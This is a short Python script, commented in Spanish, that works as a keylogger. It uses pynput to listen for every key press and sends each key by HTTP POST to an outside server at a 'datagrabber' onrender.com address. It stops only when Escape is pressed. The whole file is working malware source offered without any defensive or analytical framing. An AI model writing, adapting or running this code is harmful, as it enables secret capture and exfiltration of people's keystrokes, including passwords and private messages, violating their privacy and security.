import pynput
import requests

from pynput.keyboard import Key, Listener
# URL del servidor
SERVER_URL = 'https://datagrabber.onrender.com/grab?data=a'

def on_press(key):
    # Convertimos la tecla en string
    key_str = str(key).replace("'", "")

    # Enviamos al HTTP
    try:
        response = requests.post(SERVER_URL, key_str)

        response.raise_for_status()
    except requests.exceptions.RequestException as e:
        print(f"Error sending request: {e}")

def on_release(key):
    if key == Key.esc:
        #Detenemos al pulsar escape
        return False

# Creamos un escucha
listener = Listener(on_press=on_press, on_release=on_release)
listener.start()
listener.join()